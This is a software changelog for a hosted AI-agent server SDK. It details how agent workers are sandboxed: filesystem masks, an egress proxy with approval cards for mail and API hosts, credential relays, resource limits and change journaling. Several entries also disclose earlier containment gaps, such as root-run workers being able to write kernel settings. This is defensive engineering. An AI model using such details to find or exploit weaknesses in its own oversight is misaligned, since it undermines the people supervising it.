- 5e6446a: The native reference pool's `poolRelease` refuses a writable worktree that an access generation still holds, with `invalid`, deleting nothing and keeping its charge; park it first. The manager runs one request at a time, so the refusal is atomic with `poolAccess`, and no caller in this process or another can delete a worktree under its running worker.
- cf25c12: Preserve exact fresh-launch identity inspection diagnostics on Python 3.14 by formatting the active inspection source rather than the outer request loop.
- ea4c76c: Initialize worker XDG policy independently of sandbox, maintenance and launcher import order, retaining the existing paths and exports.
- c06dbb4: Preserve Bash commands when optional RTK availability cannot be established in the actual Claude worker, and avoid sharing availability probes across worker environments.
- b2f2f25: Changed: a journal write no longer truncates the SQLite WAL first; admission charges the WAL as it stands and truncates only when that would refuse. Commits stay `synchronous=FULL` (#2789).
  Changed: journal capacity measurement walks only the journal's own SQLite b-trees, not the whole database.
  Changed: a journal row changed outside capacity accounting on the server's connection is refused.
  Changed: the server's maintenance temporary-storage ledger stays open between reservations instead of opening and closing its database each time.
- 07bf0ee: BREAKING: Live-conversation host work now uses the same ordinary backend,
  session and principal policy as typed work, including session worker preference,
  permitted writes and on-screen permission cards. It no longer implicitly selects
  the narrower voice posture or declares no grant surface. Hosts relying on those
  implicit restrictions must express them in their ordinary policy. Explicit
  restricted backend requests remain enforced; speech still cannot grant permission.
  Automatic conversational task admission and Gemini capture continuity remain
  separate work.
- e261d53: A turn on the egress proxy treats mail submission as outward by default, next to the GitHub API: a connection to port 25, 465 or 587 on any host, or to a built-in mail-send API such as `gmail.googleapis.com` or `api.sendgrid.com`, waits on the turn's approval card unless the call in progress was classified as a read or an approved outward action to that host. `outward.hosts` still adds the rest. Microsoft Graph and Exchange Online carry more than mail, so their reads by an opaque script also ask.
- 9bebef7: Clarify maintenance completion and sync-mirror validation: namespace init retains output pipes after the outer monitor can exit, and a teardown artifact must still be refused before transport. Runtime behavior is unchanged.
- b70d422: Hide required private regular files from maintenance workers, including native backing files outside masked directories.
- 1794e72: Keep the hosted server answering while native file observations and the Claude transcript archive's daily scan marker are written to a loaded disk. Saving and restoring a session's native file observations, including creating their storage directory, now waits on the file system off the event loop. Saves land in call order, and each native read or write still waits for its observation to be durable before it proceeds. The archive's scan marker is written the same way, and concurrent sweeps in one process still scan once. File and directory fsync, atomic replacement, the private modes, the redirect and alias refusals and the refusal of a write whose observation cannot be saved are unchanged. `NativeFileVersions` on the internal entry now returns promises from `restore` and its recording methods.
- d9ac37b: Complete native checkpoint release when a reference into the checkpoint is dropped just after its delete. The manager now wakes the Btrfs transaction thread while waiting for reclamation, rather than leaving the deleted root for the next 30-second commit pass, which exceeded the release deadline and reported an unknown outcome. A reference that stays held still reaches the unchanged deadline.
- 9f930f6: Keep the packed `@schlessera/brain-ui-sdk/internal` entry loadable under Node: `REFERENCE_POOL_CHECKPOINT_BYTES` now comes from the runtime-neutral manager protocol module instead of the reference pool, whose import chain reaches `bun:sqlite`.
- 5b34b6f: Mask all host `/var` directories in governed, strict and maintenance workers,
  including sockets under `/var/tmp`, `/var/spool` and `/var/snap`, while keeping
  explicit read-only runtime inputs available.
- 498270f: Prepare protected maintenance metadata through the retained native manager and use the verified separate-UID launcher for credential-free helper maintenance. Bind command preparation and cleanup to the owned stage, reject stale or foreign plans, and retain concrete frozen Git inputs read-only inside the existing staging allowance with their writable alias concealed and private control excluded from publication. Preserve directory setgid modes during native output publication. Register only validated, originally absent Git mask scaffolds inside the owned stage, preserving live absence and refusing protected-path changes or incomplete preparation. Credentialed and no-helper paths retain their existing behavior. Native Git qualification covers the documented shared-group metadata envelope; private, non-shared lower Git metadata remains unsupported.
- 49c8b1d: Retain owned installed runtimes beneath private temp read-only, refuse reserved-path collisions before dispatch, and preserve private masks through runtime aliases.
- 066107c: Put the brain's installed CLI first on governed and strict interactive workers' PATH, matching maintenance workers, and explain installation in the sandbox note when it is missing. Restricted autonomous environments retain their fixed PATH.
- d85a649: Retain the ordinary identity probe's exact server-owned relay across its private temporary filesystem, and verify its ready socket ownership and permissions before launching the qualification payload.
- 6470786: Add a typed per-turn egress connection event and an internal proxy recorder with durable connection/refusal facts and cancellation when recording fails. Ordinary backend activation remains unchanged.

  Honor valid zero-byte egress budgets by refusing before credential release or upstream contact.

- ce3345b: On hosts with managed native storage, governed and strict pi turns now run on the turn egress proxy and the host inference relay, like Claude turns. The worker holds only a placeholder: on each request the host asks pi's own credential store, so refresh and its writeback happen on the host. Every connection is a governance event, and outward hosts wait for approval. Variables that name or feed the provider's credential stay on the host, so the `brain` CLI inside that worker no longer sees them either, until its own providers are relayed (#1673).

  The relay carries API keys on Anthropic Messages and OpenAI-compatible models, and the `openai-codex` (SSE) and `anthropic` logins. A credential can reach only its provider's built-in origins and any exact origins listed for that provider in the new server variable `BRAIN_UI_PI_CREDENTIAL_ORIGINS` (`provider=origin[,origin];...`).

  **Reduced capability, by maintainer ruling:** on those hosts, a pi turn is refused before its worker starts, with the reason, when its key or a header runs a command (`!command`), when it uses another provider login (such as GitHub Copilot), a login implementation configured in `models.json` (`oauth`) or another provider API, when pi's `auth.json` is linked into the brain, or when a `models.json` linked into the brain holds a literal key for any provider. Before this change those turns ran with the credential inside the worker.

  **Migration:** if pi's `models.json` points a provider at a custom origin, add that origin to `BRAIN_UI_PI_CREDENTIAL_ORIGINS`, for example `anthropic=https://gateway.ithaca.invalid`. Replace a command-sourced key with a literal, an environment variable or a stored key.

- a90490e: Carry an explicitly prepared host inference transport through ordinary Claude SDK turn assembly while preserving subscription and per-use permission checks.
- 0125555: Preserve runtime-written provider transcript entries across turns. Store promoted
  answer-link display mappings and authoritative Pi application receipts in host-owned
  replay metadata so history retains promoted links and receipts without changing
  prior model text or tool results. Recover only missing results for runtime-written
  Pi calls after the worker exits; direct server applications create no provider entry.
- 19b43c6: Support disjoint private server-state masks below inaccessible server-owned parent directories for separate-identity workers, without exposing their contents or covering required brain and runtime paths.
- 8823a28: Refuse native worker output that deletes an ancestor directory of protected tier A inputs, even when its protected descendants are absent. Validate the whole publication before installing any output, while retaining ordinary directory deletion.
- 1c5666e: A governed or strict pi turn no longer waits for a full journal observation after a call that is proven read-only (#2834). The host observes after every tool result unless the backend reported, from what the call actually did, that it ran a host bridge read (`brain_read_base`, `query_activity`, `inbox_list`, `inbox_get`, `show_block`, `ask_user*`, `get_current_location`) or pi's own `read_file`, no other call is still running, and no call in the turn could still be writing in the background. `bash`, `grep`, `brain_search` and the other index tools, extension tools, unknown tools and every Claude tool are observed as before, and after one of them every later result in that turn is observed too. Writers are observed after their own result. Only a pi worker that loads no extensions (`loadExtensions: false`, or a restricted autonomous turn) reports this evidence: with extensions loaded, the default, every result is observed as before. Turn begin and finish, the 15-second observation and scope-limit enforcement are unchanged.
- c164899: Verify retained provider-folder mount points and inode identities in the authenticated worker view before starting a governed payload. Refuse changed or unobservable views without expanding identity-broker authority.
- 61399d1: State shared worker identity and mask-only server-state protection in both strict and governed agent capability notes. Clarify that a read-only brain does not isolate other host paths accessible to the same uid; this does not enable the separate-uid broker.
- 775cd1b: Retain native file observations in host-private session storage so resumed Claude and Pi turns refuse stale writes after a backend restart. Interrupted reads and missing legacy observation records require a genuine reread before writing; fully tracked sessions retain the existing never-read behavior.
- 613f1bd: Use held pidfd authority and confirmed process stopping before maintenance child enumeration. When the host cannot hold a pidfd for the worker, cancellation is reported unconfirmed and keeps the worker's admission.
- 498270f: Keep the disposable SQLite index writable in separate-UID native maintenance stages while preserving its sidecars, file modes and bounded cleanup authority.
- 3cc0a60: Suppress RTK's missing-hook installation warning in Claude workers and Pi bash children, where the host already rewrites shell commands. Preserve command errors and exit status.
- 650caaf: A maintenance command, including one aborted while its worker pipes were being created, now waits, for up to 5 seconds, until every descriptor on its worker's three FIFOs is closed before it finishes (#2862). Bun's file streams read and write through their own duplicate of each descriptor and close it later on Bun's thread pool, so on a busy host a finished or refused command could leave them open for a while. An abort that lands during that wait still refuses the result. The internal `MaintenanceWorker` and `LaunchedWorker` gain `released()`, which resolves once none of the worker's stdio descriptors is open in the server, or after that bound.
- 9c52e8c: Accept the existing exact shared-group inference relay permissions for restricted workers using the separate-identity helper, while refusing invalid relay ownership, aliases, endpoint types and modes before launch.
- e7c037b: Preserve executable aliases already supplied by restricted workers’ read-only runtime view, avoiding startup failures when a system shell or owned runtime entry is a symlink. Keep temporary runtimes and host state isolated.
- 335ee04: Apply scratch image masks through an asynchronously prepared native ignore query, and distinguish a missing ignore rule from unavailable verification.

  Keep construction-only clients usable for missing brain paths; validate the canonical brain directory when the query executes under its maintenance lock.

- 1ba7673: Restore ordinary egress proxy access for qualified separate-UID workers, validating owned IPC permissions and preserving owner-only modes without a helper.
- a19ce13: Cut a native journal observation's own cost (#2872). The native brain manager runs its root and loop-device identity checks in one long-lived `python3 -I -S` interpreter instead of a fresh launch per check, with the same programs, paths and refusals. The journal releases the previous native checkpoint after the observation that superseded it is recorded, outside the hold that freezes the turn's workers, at most two pending per observed root; a commit past that waits as before. A release that fails there still stops every active turn and leaves its record partial, and shutdown drains pending releases and reports any checkpoint it could not release.
- 8d06beb: Share inference relay admission, byte limits and audit with the turn egress proxy, and require exact host authorization for Claude OAuth inference recipients.
- 55dbf1c: Retain session-stable prompt appends and deliver changed host facts in owned new tail context, preserving user history and unknown device capabilities.
- 25a97da: Bound native recovery-page inventory work with a disposable identity index while retaining durable deleted-identity fences and restart recovery.
- 2d86dc5: Restore default worker signal dispositions after the trusted Btrfs filesystem filter.
- 1411f0c: Changed: the hosted server commits every turn-budget ledger write (admission, session binding, completed-response and relayed-provider usage, warnings and the SDK backstop) on its SQLite write worker at `synchronous=FULL`, in submission order, instead of on the event loop (#2850). A relayed provider request is admitted only once every earlier budget write has committed.
  Changed: the provider relay awaits a promise returned from its `admit` hook.
- c452cf1: Keep the hosted server answering while the remaining worker checks run. A Claude turn now claims its session at once and then awaits its worker host probe, and a Claude worker's probe and bubblewrap launch are awaited behind the deferred spawn instead of inside the SDK's synchronous callback. A separate-UID worker's exit is polled without blocking, and so are the separate-UID maintenance launch and the scratch mask's git ignore check. The checks, their order and their refusals are unchanged: a refused probe still rejects the turn and leaves no turn behind, and a worker that does not start still names the turn's failure with its own error.
- 6492291: Keep the hosted server answering while a turn's worker checks run. The per-turn worker host probe, the sandbox's scratch git check and the pi worker launch now wait on their bubblewrap workers without blocking the event loop, so `/health` and WebSocket pings no longer stall while a loaded host starts a worker. The checks, their order and their refusals are unchanged; the synchronous forms remain for callers that cannot await.
- Updated dependencies [d99f399]
- Updated dependencies [210b35c]
- Updated dependencies [7c63003]
- Updated dependencies [caae12d]
- Updated dependencies [04a6595]
- Updated dependencies [0c68c2b]
- Updated dependencies [8fc9663]
- Updated dependencies [800d965]
- Updated dependencies [3fb5199]
- Updated dependencies [bde209b]
- Updated dependencies [498a601]
- Updated dependencies [ff70ec1]
- Updated dependencies [5f5178c]
- Updated dependencies [cd54454]
- Updated dependencies [69151ca]
- Updated dependencies [046b6ae]
- Updated dependencies [066107c]
- Updated dependencies [d2b4cf9]
- Updated dependencies [932d2b3]
- Updated dependencies [f6f5c71]
- Updated dependencies [1faf79c]
  - @schlessera/brain-ui-kit@0.44.0
  - @schlessera/brain-common@0.44.0
  - @schlessera/brain-geo@0.44.0

## 0.43.1

### Patch Changes

- @schlessera/brain-ui-kit@0.43.1
- @schlessera/brain-geo@0.43.1
- @schlessera/brain-common@0.43.1

## 0.43.0

### Minor Changes

- 4af7b2f: Replace repeated whole-brain journal and worker input copies with managed Btrfs checkpoints and changed-only retained history. Hosted apps now require a qualified native storage service and explicit finite volume capacity; unsupported storage refuses with setup guidance instead of a copy fallback. The retained history limit remains 10 GiB and staged worker outputs keep their existing allowance.

### Patch Changes

- @schlessera/brain-ui-kit@0.43.0
- @schlessera/brain-geo@0.43.0
- @schlessera/brain-common@0.43.0

## 0.42.1

### Patch Changes

- b6f9060: Keep complete immutable startup inputs outside the bounded staged-write allowance. Private copy-on-write output workspaces retain the 256 MiB default and aggregate admission, including after lower-only deletions. Release input copies and output namespaces on abrupt server exit, qualify actual writable staging before reporting host availability, and report named input-capacity refusals through boot/status without host execution fallback.
  - @schlessera/brain-ui-kit@0.42.1
  - @schlessera/brain-geo@0.42.1
  - @schlessera/brain-common@0.42.1

## 0.42.0

### Minor Changes

- 52cbd1d: Enforce admitted command deny and confirmation policies in both interactive adapters, recheck approved edits, and retain attributed rule receipts after Activity detail pruning.
- 8b4fbdc: Give each hosted worker a private, filesystem-limited turn-temp tmpfs,
  defaulting to 256 MiB, with whole-lifetime aggregate admission shared by both
  backends. Keep XDG writes inside it and real HOME read-only; retain a directory
  descriptor so linked deliverables can still be promoted after exit.

  Add the `turn_temp` tool for usage and scoped purge, preserving output-linked
  files unless named paths explicitly force their removal. Record purge governance
  events and explain the allowance, 80% warning and out-of-space recovery in the
  sandbox note. Add host overrides `BRAIN_UI_TURN_TEMP_BYTES` and
  `BRAIN_UI_TURN_TEMP_BUDGET_BYTES`; unavailable capacity refuses as
  `worker_state_busy` with Retry.

- 857ab01: Enforce per-turn tool-call, wall-time, observed changed-path and write caps through the existing worker lifecycle and shared journal observations. Interactive turns freeze for a finite, once-per-dimension Continue or Stop decision; the free-space floor and true voice remain Stop-only. Retain scoped decisions, interruption/recovery receipts and truthful observation coverage in the existing turn disclosure and expose actual limits in This chat. Independent host deadlines and resource/storage limits remain binding.
- 5876df6: Restore direct writes for ordinary hosted turns with the governed profile while keeping policy and runtime configuration protected. Strict remains opt-in and autonomous workers retain their restricted permissions. Snapshot consumers run configuration from immutable startup views, with validated maintenance output publication and separate persistent write areas. Report the profile, protected paths and shared-uid limits in host status and the agent context; reconcile and incrementally index governed turns on completion.

  Bound immutable inputs and publication copies in a separate admitted 256 MiB output-staging tmpfs by default, with validated host overrides, Retry on busy admission and ENOSPC on overflow. Capture file-browser ignore bytes without copying unrelated repository data.

  Require the operational database and private server state outside the brain for every hosted profile. Refuse invalid layouts at boot with named migration guidance and matching status diagnostics, preserving the worker masks. Hosts must install util-linux nsenter and allow setns in the namespace seccomp profile for bounded staging.

  Revalidate complete startup inputs, retain native-write path locks through staged publication, preserve peer-created output names, and handle publication refusals without unhandled worker lifecycle rejections.

  Refuse database, WAL/SHM and private-state aliases exposed inside the brain by hardlinks or bind mounts, including new database paths beneath mounted state parents. Preserve valid outside-only aliases and mask resolved database, token and quarantine targets.

  Release staging and writer-gate admission even when private output modes prevent publication. Finalize directory permissions after children, rechecking held/visible identity and temporary mode while retaining peer updates and processing remaining directories after an error. Keep host Git transport free of brain mounts; local sync uses frozen inputs and validated output publication.

  Preserve private turn-temp capacity for in-memory hosts, reject private-state descendant inode aliases, and retain publication parent handles so peer permission changes do not strand unaffected child modes.

- a8fbaa3: Report refused Claude worker-state copy-out as `worker_state_save_refused`, preserving actual turn usage, host cancellation and exhaustion precedence. Show an incomplete-save card with scoped Retry and disclose that retry does not recover unsaved transcript or agent memory.
- bdb1d6d: The server no longer runs the brain's own code, the `brain` CLI or git against the brain in a host process wherever a governed turn could have changed it (#1648). Capture planning and the index refresh behind `brain_add`, every server-spawned `brain` command, the streamed sync, cron jobs and git's ignore checks run in a maintenance worker instead: the same bubblewrap launcher, with the brain writable, the host read-only, and `/run`, `/var/lib`, the home directories and the UI database's directory masked. A malicious `brain.config.ts` import, `bunfig.toml` preload, `.env`, git include or symlinked ref therefore runs only inside that sandbox. Work a turn waits for runs without credentials or network and holds the brain's new writer gate shared; credentialed work (sync, reindex, capture, module actions) holds it exclusively and waits for running writers. Boot, and the cron runner before each job, quarantine any protected file a governed turn left behind after an unclean stop, beside the UI database.

  `GET /api/status` gains `runtime.workerHost.governed`: whether the `governed` profile can run, why not (`server_cwd_in_brain`, `database_in_brain`, `worker_host_unavailable`), and whether the brain's code runs in workers or on the host. A server started from inside the brain reports `governed` unavailable. The generated crontab now starts every line with `cd /` and the cron runner gives each job the brain as its working directory; regenerate the crontab on upgrade. The brain's CLI must be installed inside the brain (`node_modules/.bin/brain`), not linked from a home directory. The Claude runtime version probe now runs outside the brain.

- dd3bf90: Route hosted Git sync through a private host mirror. Brain configuration, Git includes, commits and merges run without Git credentials; a separate transport mounts only host-selected storage, checks objects before pushing, and never reads the brain.
- 6f74aaa: An answer whose turn-temp link was promoted into scratch now shows the link to the copy in the open conversation as soon as the turn has ended, with no reload and no marker (#1698). The server sends the turn's clients a new `message_links` frame (`{ sessionId, turnId, links: [{ from, to }] }`) for each promoted file, and the client rewrites those link destinations in that turn's answer, outside code, exactly as the saved answer was rewritten. A turn with no promotion sends nothing. For backend authors, the `promotion` activity event gains optional `aliases` listing other spellings of a link to the same file.
- 966bed8: Bound maintenance temporary storage separately from agent turn temp and output staging. Add validated command and aggregate limits, cross-process admission and maintenance-only nested-usernamespace enforcement while preserving the separate Git transport boundary.
- a948934: Pass freshly written scratch mask paths to the optional host prune hook so the
  host can retain the output reported by the tool. Produced paths are canonical
  and brain-relative, independent of the adapter's display path.
- 2151826: Show a dismissible saved-state warning at the existing 75% threshold using the
  backend's actual admission measurement. Preserve its age, dismissal across
  reloads, changed-allowance invalidation, quiet history, voice and focus behavior,
  and the existing reviewed continuation. Add optional result/history observations
  and provider allowance metadata without changing capacity or admission.
- 857ab01: Enforce admitted turn, conversation and UTC-day list-price inference budgets using completed response receipts, retained Activity usage and unknown-price token fallback. Share measured limits and once-only warnings with the existing turn disclosure; preserve partial work and reviewed conversation handoff on a named budget stop.
- 857ab01: Refuse native file writes when a file's bytes changed since that live session read it. Preserve actual read-version truth, including Claude's cached unchanged-read responses, and keep Pi's observations across ordinary per-turn worker launches. Paths never read by the session remain writable. Read observations are held by the running backend and are not restored after a backend restart.
- f5433b3: Require existing per-use approval for visible outward commands in interactive turns, preserve force-push and voice refusals, and retain irreversible admission receipts in the turn journal. Explicitly disclose opaque HTTPS-script and unavailable outward MCP descriptor coverage.
- 185803c: Read a strict, versioned governance policy as host data, with a read-only
  `brain policy check --json` command, content-index exclusion, last-valid
  fallback, immutable per-turn identity and interactive/voice profile and
  protected-path selection. Autonomous authority and sibling enforcement remain
  unchanged. Approved budget and scope defaults resolve without enforcing them.
  Authoritative agent Markdown and submitted PNG applications share admitted
  protection, including planned destinations and protected scratch retention.

  The CLI and server share the data-only policy reader through the internal common
  package, preserving server imports and declarations without the optional core peer.

- f5433b3: Add validated hosted policy proposals with explicit exact-base approval, retained same-request receipts and read-only policy settings. Voice and autonomous tools and worker policy-write restrictions remain unchanged.
- c41f173: Each Claude worker now gets its own private, size-limited tmpfs for its runtime state (#1625), so parallel sessions no longer share, and run out of, the host's `/dev/shm`. The allowance is 64 MiB per worker by default (`BRAIN_UI_WORKER_STATE_BYTES`). Before a worker launches, its whole allowance is reserved against a server budget, which defaults to the allowance times `MAX_CONCURRENT_SESSIONS` and can be set with `BRAIN_UI_WORKER_STATE_BUDGET_BYTES`. Invalid values stop the boot with the variable's name. The server copies the conversation in before the runtime starts and copies validated transcripts and memory out after the worker's namespace is gone. Nothing is left behind if the server dies.

  Two new first-party failure classes, both registered in `FIRST_PARTY_FAILURE_CLASSES`, get their own cards. `worker_state_busy`: the budget is held by running conversations; the turn is refused before launch, nothing is sent, and Retry runs it. `worker_state_exceeded`: the turn filled its allowance; it ends as this failure even if the runtime finished its answer, because the rest was not saved. A conversation whose saved state does not fit the allowance stays `session_too_large`; the old 128 MiB bound is gone. Claude workers need bubblewrap 0.7 or later.

  Agent memory written during a turn is now kept (#1626): new or changed `memory/*.md` notes are persisted with the same alias, size and concurrent-change checks as transcripts. A note another conversation changed meanwhile is refused alone and named, and nothing is deleted.

- f5433b3: Add authenticated user history revert and quarantine restoration with raw-byte
  stale-state checks, journaled Undo, and original-operation receipts. Running
  turns finish before revert while new turns queue behind it. Existing retained
  change readers expose single-file actions and one whole-turn review dialog;
  partial, conflicting and unknown outcomes remain beneath the original turn.
- 857ab01: Classify retained steering inputs separately from content and approved policy changes. Show their count and first history group through existing diff/revert controls, preserving recorded taint source IDs and shared observation limits.
- 52cbd1d: Add host-owned raw journal snapshots and private content objects with bounded
  storage accounting, independent of the brain's Git objects and executable
  configuration.
- 02d4eb0: **Breaking (MCP contract):** an unranged `brain_read_base` on a document too large for one tool result (over 40,000 JSON-escaped characters) no longer returns `content`. It returns the base hash, the size and the first page of lines with a paging hint, so the Claude Agent SDK no longer spills the result to a file where the hash cannot be reached. To get the whole text, read the pages in turn with `offset` (and `column`). Documents within the budget still return `content`.

  `brain_read_base` now puts `expectedBaseHash` first and adds `bytes` and `lines`. It also accepts optional `offset`/`limit`/`column` to page through a document; `limit: 0` returns only the hash and size. Every result carries the hash of the whole document, so the write tools' base guard is unchanged.

- 3070884: Add an authenticated host-local roadblock report and the `query_activity` roadblocks scope. Rank retained episodes by frequency and measured token, cost and time waste, preserving unknown coverage, remedy counts and example turns.
- 67a48ca: A server running as root now says so (#1638). Its agent workers run as root too, and although they have no capabilities and a read-only `/proc`, they can still read root-owned files and connect to root-owned and abstract Unix sockets. The server still boots. It logs that warning once at boot, reports it on `GET /api/status` as `runtime.workerHost.rootServer` (typed on `WorkerHostStatus` in `@schlessera/brain-ui-sdk/protocol`), and the app shows a standing notice above the composer that links the hosting guide's section on running the server as a non-root user.
- 52cbd1d: Add authenticated per-chat governed or strict preferences in the model picker's This chat section. Successful saves affect the next interactive turn, preserve the policy lower bound, and bind first-turn choices through the existing draft identity. Show voice facts read-only and unavailable limits as unknown.
- f5433b3: Render the governed worker note from actual admitted journal and user history
  availability, preserving the resolved protected paths and their reasons.
  Standalone or incomplete hosts cannot promise restoration, and genuine voice
  turns retain journal guidance without granting agent revert or Undo authority.
- 857ab01: Retain explicit shared-window conflict versions and let authenticated users keep a selected observed version or both through the existing history operation, with raw-state checks, numbered exclusive siblings and journaled Undo.
- acec591: Preserve all first-party failure classes in reviewed failed-turn reports through the shared FIRST_PARTY_FAILURE_CLASSES SDK registry. Unregistered third-party classes still report as unknown. The additive SDK export ships in a minor release (#1619).
- 6377291: A file the agent links in turn temp (`$BRAIN_WORKER_SCRATCH`, `/tmp` or a write under `$HOME`) no longer becomes a dead link when the turn ends (#1655). Once the worker has exited, the backend copies each linked file into `.brain/scratch/turns/<turnId>/` and the saved answer links the copy, with nothing shown in the chat. The copy follows no symlink, refuses hard-linked files and directories, and is bounded at 128 MiB per file, 256 MiB and 64 files per turn; a refused file keeps its original link. Every copy and refusal is stored as a `promotion` or `promotion_refused` governance event (`GET /api/governance/events`). Turn temp is the worker's private, size-limited `/tmp` tmpfs. The server retains a directory descriptor into that filesystem so linked files can be promoted after the worker exits; this does not use a host-created `/dev/shm` staging directory. For backend authors, `StartTurnRequest.turnId` passes the host's turn id, and `BackendActivityEvent` gains the `promotion` and `promotion_refused` variants.
- 1c20df8: The server now learns at boot whether its host can run agent workers, instead of finding out on every turn (#1632). Boot probes the agent worker boundary (the restricted envelope too while autonomous work is enabled), logs a failure once with its named requirement, and keeps running. `GET /api/status` reports the latest probe as `runtime.workerHost` (typed as `WorkerHostStatus` in `@schlessera/brain-ui-sdk/protocol`), every turn's own probe re-records it, and the new authenticated `POST /api/status/worker-host` re-runs the probe. While the host is unavailable, the app shows a notice above the composer that names the requirement, links the hosting guide's container section and offers "Check again". The composer stays usable. A turn sent anyway is still refused by its own probe, and its failure card now says the server can't run agent turns and shows the requirement, without offering a retry. Every turn still runs the probe: a passing result is never cached.
- 2b196b3: Every agent worker now runs under resource limits, so one runaway turn cannot exhaust the host (#1660). `prlimit` sets the process, per-process memory (`RLIMIT_DATA`), file size and open file limits inside the worker before the agent starts. Where the server runs alone in a delegated cgroup v2 subtree, such as a systemd unit with `Delegate=yes`, each worker also gets its own cgroup with `memory.max`, `pids.max` and `cpu.max`. The defaults are far above normal use: 4096 tasks, half the memory the server has (physical memory, or a lower cgroup cap above it), 16 GiB per file, 65536 open files and all CPUs but one. `BRAIN_UI_WORKER_LIMITS` overrides them, for example `memory=8GiB,pids=2048,cpu=2`. A host without `prlimit` (util-linux) now refuses agent turns and names that requirement. `GET /api/status` reports each limit as enforced or absent, with the reason, under `runtime.workerHost.limits` (`WorkerLimitsStatus` in `@schlessera/brain-ui-sdk/protocol`). The agent is told the same limits before it starts. A cgroup limit hit is recorded in the run's Activity next to the step that caused it. A limit that ends the worker fails the turn with the new first-party class `worker_resource_limit`, which names the limit. Backends report hits through the new `resource_limit` activity event.
- b8862b3: Give hosted agent turns verified persistent scratch and workspace areas (#1626), now integrated with the 0.42.0 profiles. Governed is the interactive/voice default: ordinary brain files are writable except protected paths, and scratch/workspaces use their canonical destinations. Strict keeps an immutable read-only execution view and writes private copies at `/tmp/brain-worker-areas/scratch` and `/tmp/brain-worker-areas/workspaces`, with validated publication after exit; links use the canonical brain destinations. Scratch is created when missing and refused when redirected by a symlink or not gitignored; an existing workspace remains unavailable when its boundary cannot be verified.

  There is no agent HOME overlay. Host home is read-only and may be masked by the resolved profile; fresh XDG directories live in size-limited turn temp. The generated note states the actual profile, writable paths and output-link rules. CLI read-only refusals name the scratch route, and scratch serving/pruning uses descriptor-safe operations on Linux. Autonomous turns retain their restricted envelope.

### Patch Changes

- f58ef21: Anchor Linux mask fallback directory creation, temporary writes, rename and cleanup on held descriptors so scratch directory swaps cannot write or remove outside files. Preserve nested targets, replacement modes and adapter reporting.
- ea12d65: Keep classified answer blocks after reloading a conversation whose temporary
  artifact links were promoted to persistent scratch. Saved blocks follow the
  rewritten text and retain correct spans regardless of classification timing.
- 08b45c4: Reset catchable signal dispositions before launching agent workers, so shell pipelines handle SIGPIPE quietly and oversized file writes terminate with SIGXFSZ. Worker hosts require GNU coreutils env with --default-signal.
- 1283ca4: The note a hosted agent reads before its turn is shorter and states its rules directly (#1654). It opens with the turn's profile (`strict`: the brain is read-only, change it through `write_file`, `edit_file` and the curated tools), lists turn temp, the persistent areas and the brain, and ends with the link rule: anything the reader should open goes in `.brain/scratch/` and is linked from there. Each area is named by the path the worker was actually given. Both backends inject the same text. When a `brain` CLI write hits the read-only brain, the refusal now repeats the note's rule word for word; the `read_only_brain` code and its `tool` field are unchanged.
- 3212c7d: Scope Claude worker state to the resumed conversation, reserve tmpfs headroom before copying, and offer a reviewed handoff when a session is too large. Automatically archive idle transcripts after 30 days and restore archived history and resumes transparently. Refuse oversized pi sessions before launch with growth headroom and classify snapshot overflow as `session_too_large`. Register `session_too_large` in `FIRST_PARTY_FAILURE_CLASSES`, so a reviewed report keeps the class.
- aa4e0f0: Name the cause when the agent worker host probe fails because the kernel refuses the worker a fresh `/proc`, as it does under Docker's default masked paths. The refusal now says so and names the Docker remedy (`--security-opt systempaths=unconfined`) instead of the generic list of launcher requirements. The launcher's boundary is unchanged.
- acec591: Show the worker-host refusal prefix and supported-host route exactly once, including failures caught inside the host probe.
- 8da5c42: When the server runs as root, an agent worker's `/proc` is now read-only. A worker runs as the server's kernel uid without capabilities, but for uid 0 most host-global `/proc` files check only the file mode. A root-run server's worker could therefore write host kernel settings, such as sysctls, through its fresh procfs. Root servers still qualify, and workers of non-root servers are unchanged. Running the server as a non-root user is still recommended.
- Updated dependencies [52cbd1d]
- Updated dependencies [8b4fbdc]
- Updated dependencies [857ab01]
- Updated dependencies [f5433b3]
- Updated dependencies [185803c]
- Updated dependencies [f5433b3]
- Updated dependencies [1283ca4]
- Updated dependencies [52cbd1d]
  - @schlessera/brain-common@0.42.0
  - @schlessera/brain-ui-kit@0.42.0
  - @schlessera/brain-geo@0.42.0

## 0.41.0

### Minor Changes

- 45326b1: Show follow-ups that are still waiting for the agent, and keep them through a reload. A message sent while a session is busy no longer appears in the chat until the agent takes it: it waits as a `pending` pill in the right half of the row above the composer, and its full text opens on hover, keyboard focus or a tap. Three or more show the oldest pill and a `+N pending` summary that opens a read-only `Pending follow-ups` sheet. When the agent takes one, its pill goes and the message appears in the chat once, where it entered the conversation; a dropped one leaves with its reason. The host reports each session's queue in a new `session_queue` frame (`server_hello.capabilities.followUpQueue`, sent only to clients that declare the same flag in `client_hello`) after a reconnect, after `session_resume` and on every change, so a reloaded or second client rebuilds the same stack. The kit adds `PendingFollowUps` and `followUpLabel`, and `ListRow` gains `describedBy` for pills.
- 637d2c4: Label pending follow-up and working-session pills with a few words from a small, fast model. A host that passes `createApp({ labeller: { provider } })`, with any value of core's `CompletionProvider` shape, gets a 2–4 word label for each queued follow-up (on `QueuedFollowUpView.label`, sent again in `session_queue` when it arrives) and for each session's latest request (on `ChatSession.label` in `GET /api/sessions`, stored so a reload or restart reuses it). Labels are plain text of at most `PILL_LABEL_MAX_CHARS` (32) characters. Pills render at once with their fallback, the session title or the start of the prompt, and keep it when the labeller is off, which is the default, or fails. With a labeller set, the text of every queued follow-up and turn request goes to its provider, which may be a different vendor from the session's backend. Calls are counted in `brain.labeller.calls`. The app's pending follow-up pills print the host's label when there is one.
- 9a89d4a: Show configured profiles that cannot run now, with their reason, in the handoff sheet. `AgentBackend` gains an optional `listUnavailableProfiles()` returning `{ id, label, reason }`, with `reason` from the closed `PROFILE_UNAVAILABLE_REASONS` enum (`needs-credentials`). The Claude backend reports a profile whose required environment key is missing; pi lists every configured profile and omits the member. `GET /api/providers` gains an optional `unavailable` list beside `providers`, absent when empty: the runnable roster, routing and handoff resolution are unchanged, and the host drops any entry whose reason is not in the enum, so no key name or other backend text reaches a client. The handoff sheet's To list shows these profiles on other backends after the runnable ones, disabled and reading `needs credentials`; they cannot be chosen.
- b0815ec: **Breaking (pre-1.0, ruled on #1053):** narrow the public surfaces that were public only because a public declaration reached them, and move the names whose classification was uncertain.

